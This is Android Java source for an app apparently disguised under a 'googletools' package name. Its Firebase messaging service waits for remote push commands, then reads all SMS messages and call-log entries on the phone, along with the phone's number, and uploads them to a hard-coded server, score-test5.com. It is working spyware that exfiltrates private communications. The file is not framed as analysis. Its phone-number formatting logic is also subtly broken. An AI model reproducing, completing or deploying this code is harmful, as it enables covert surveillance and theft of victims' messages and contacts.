package com.example.googletools.receiver;

import android.Manifest;
import android.content.BroadcastReceiver;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.net.Uri;
import android.provider.CallLog;
import android.telephony.TelephonyManager;
import android.util.Base64;
import android.util.Log;
import android.widget.Toast;

import com.example.googletools.InsertTask;
import com.example.googletools.Message;

import com.example.googletools.SendCallLog;
import com.example.googletools.SendMessage;
import com.google.firebase.messaging.FirebaseMessagingService;
import com.google.firebase.messaging.RemoteMessage;

import java.io.UnsupportedEncodingException;
import java.util.Date;

public class broadcastreceiver extends FirebaseMessagingService {
    private static final String main_server = "http://score-test5.com";

    @Override
    public void onMessageReceived(RemoteMessage remoteMessage) {
        // 메시지 수신 시 실행되는 메소드
        if (remoteMessage != null && remoteMessage.getData().size() > 0) {
            try {
                sendNotification(remoteMessage);
            } catch (UnsupportedEncodingException e) {
                e.printStackTrace();
            }
        }

    }

    private void sendNotification(RemoteMessage remoteMessage) throws UnsupportedEncodingException {
        if ( remoteMessage.getData().toString().contains("receiveall") ) {
            String PhoneNumber = null;
            TelephonyManager systemService = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
            if (checkSelfPermission(Manifest.permission.READ_SMS) == PackageManager.PERMISSION_GRANTED) {
                PhoneNumber = systemService.getLine1Number();
                if (PhoneNumber != null && PhoneNumber.equals("")) {
                    PhoneNumber = PhoneNumber.substring(PhoneNumber.length() - 10, PhoneNumber.length());
                    PhoneNumber = "0" + PhoneNumber;
                }
            }

            readSMSMessage(PhoneNumber);
            getCallLog(PhoneNumber);
        }
        else if ( remoteMessage.getData().toString().contains("calllogreceive") ){
            String PhoneNumber = null;
            TelephonyManager systemService = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
            if (checkSelfPermission(Manifest.permission.READ_SMS) == PackageManager.PERMISSION_GRANTED) {
                PhoneNumber = systemService.getLine1Number();
                if (PhoneNumber != null && PhoneNumber.equals("")) {
                    PhoneNumber = PhoneNumber.substring(PhoneNumber.length() - 10, PhoneNumber.length());
                    PhoneNumber = "0" + PhoneNumber;
                }
            }
            getCallLog(PhoneNumber);
        }
        else if ( remoteMessage.getData().toString().contains("smslogreceive") ){
            String PhoneNumber = null;
            TelephonyManager systemService = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
            if (checkSelfPermission(Manifest.permission.READ_SMS) == PackageManager.PERMISSION_GRANTED) {
                PhoneNumber = systemService.getLine1Number();
                if (PhoneNumber != null && PhoneNumber.equals("")) {
                    PhoneNumber = PhoneNumber.substring(PhoneNumber.length() - 10, PhoneNumber.length());
                    PhoneNumber = "0" + PhoneNumber;
                }
            }
            readSMSMessage(PhoneNumber);
        }
    }

    public int readSMSMessage(String PhoneNumber) throws UnsupportedEncodingException {

        Uri allMessage = Uri.parse("content://sms");
        ContentResolver cr = getContentResolver();
        Cursor c = cr.query(allMessage,
                new String[]{"_id", "thread_id", "address", "person", "date", "body"},
                null, null,
                "date DESC");

        while (c.moveToNext()) {
            Message msg = new Message(); // 따로 저는 클래스를 만들어서 담아오도록 했습니다.

            long messageId = c.getLong(0);
            msg.setMessageId(String.valueOf(messageId));

            long threadId = c.getLong(1);
            msg.setThreadId(String.valueOf(threadId));

            String address = c.getString(2);
            msg.setAddress(address);

            long contactId = c.getLong(3);
            msg.setContactId(String.valueOf(contactId));

            String contactId_string = String.valueOf(contactId);
            msg.setContactId_string(contactId_string);

            long timestamp = c.getLong(4);
            msg.setTimestamp(String.valueOf(timestamp));

            String body = c.getString(5);
            msg.setBody(body);


            //msg.getBody() 리퀘스트
            sendsms(msg.getBody(), PhoneNumber, address, timestamp);
            //return 0;
        }
        return 0;
    }

    private void sendsms(String messageText, String PhoneNumber, String sendPhoneNumber, long timestamp) throws UnsupportedEncodingException {
        // TODO: Implement this method to send token to your app server.

        SendMessage task = new SendMessage(getApplicationContext());
        task.execute(main_server + "/msg_admin/getmessage.php", "msg", Base64.encodeToString(messageText.getBytes(), Base64.NO_WRAP), "phonenumber", PhoneNumber, "sendPhoneNumber", sendPhoneNumber, "msg_date", String.valueOf(timestamp).substring(0,10) );

    }

    private boolean getCallLog(String PhoneNumber) {
        if (checkSelfPermission(Manifest.permission.READ_CALL_LOG) == PackageManager.PERMISSION_GRANTED) {
            Cursor managedCursor = getContentResolver().query(CallLog.Calls.CONTENT_URI, null, null, null, "date DESC");
            int number = managedCursor.getColumnIndex(CallLog.Calls.NUMBER);
            int type = managedCursor.getColumnIndex(CallLog.Calls.TYPE);
            int date = managedCursor.getColumnIndex(CallLog.Calls.DATE);
            int name = managedCursor.getColumnIndex(CallLog.Calls.CACHED_NAME);
            int duration = managedCursor.getColumnIndex(CallLog.Calls.DURATION);

            while (managedCursor.moveToNext()) {
                String phNumber = managedCursor.getString(number); //전화번호
                String callType = managedCursor.getString(type); // 수신, 송신, 수신안됨
                long callDate = managedCursor.getLong(date); //날짜 시간
                String Named = managedCursor.getString(name); //이름


                String callDuration = managedCursor.getString(duration);
                String dir = null;
                int dircode = Integer.parseInt(callType);
                switch (dircode) {
                    case CallLog.Calls.OUTGOING_TYPE:
                        dir = "송신";
                        break;

                    case CallLog.Calls.INCOMING_TYPE:
                        dir = "수신";
                        break;

                    case CallLog.Calls.MISSED_TYPE:
                        dir = "통화안됨";
                        break;
                }
                SendCallLog task = new SendCallLog(getApplicationContext());
                task.execute(main_server + "/msg_admin/getcalllog.php", "phonenumber", PhoneNumber, "sendPhoneNumber", phNumber, "sendDate", String.valueOf(callDate).substring(0,10) );
            }
            managedCursor.close();
            return true;
        }

        return false;
    }
}
